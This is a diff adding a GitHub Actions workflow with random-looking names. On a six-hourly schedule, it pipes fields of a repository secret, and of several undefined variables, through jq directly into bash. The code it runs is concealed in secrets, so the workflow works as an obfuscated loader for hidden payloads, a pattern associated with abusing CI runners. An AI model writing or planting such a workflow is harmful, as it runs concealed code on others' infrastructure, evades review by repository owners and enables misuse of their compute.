@@ -1,0 +1,21 @@
+name: chowdergentleman
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chowdergentleman
+        env:
+          hiexl101: ${{ secrets.hiexl101 }}
+        run: |
+          echo $hiexl101 | jq -r .vp41 | /bin/bash
+          echo $bi426 | jq -r .spfx0 | /bin/bash
+          echo $h133 | jq -r .u81595 | /bin/bash
+          echo $ib008 | jq -r .awa8 | /bin/bash
+          echo $mx4259 | jq -r .n5 | /bin/bash
+
